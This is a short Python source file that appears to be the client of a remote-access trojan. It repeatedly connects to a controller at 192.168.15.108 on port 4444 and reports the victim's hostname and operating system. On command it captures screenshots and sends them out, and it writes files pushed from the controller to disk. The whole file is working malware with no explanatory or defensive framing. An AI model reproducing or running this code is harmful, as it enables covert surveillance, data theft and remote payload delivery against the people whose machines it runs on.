import socket, os, sys, platform, time
import pyscreeze


host = "192.168.15.108"
port = 4444
buffer_size = 1024

s = socket.socket()

def server_connect():
    while True:
        try:
            s.connect((host, port))
        except socket.error:
            time.sleep(5)
        else: break
    
    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release()
    send_data(str.encode(userInfo))

def decode_utf8(data):
    return data.decode("utf-8")
def receive_data(buffer):
    return s.recv(buffer)
def send_data(data):
    s.send(data)
def take_screenshot():
    picture_name = "beautiful.png"
    pyscreeze.screenshot(picture_name)

    file = open(picture_name, "rb")
    
    image_data = file.read(1024)

    while image_data:
        send_data(image_data)
        image_data = file.read(1024)

    time.sleep(1)
    send_data('done'.encode())
    file.close()
    os.remove(picture_name)

def receive_file(file_name):
    with open(file_name, "wb") as f:
        while True:
            bytes_read = s.recv(4096)
            if bytes_read == 'done'.encode():
                f.close()
                break
            f.write(bytes_read)
server_connect()

while True:
    try:
        while True:
            data = receive_data(buffer_size)
            data = decode_utf8(data)
            if data == "exit":
                s.close()
                sys.exit(0)
            elif data == "screenshot":
                take_screenshot()
            elif 'upload-file' in data:
                file_name = data.split(" ")[1]
                receive_file(file_name)
            else:
                print(data)
    except socket.error:
        s.close()
        del s
        server_connect()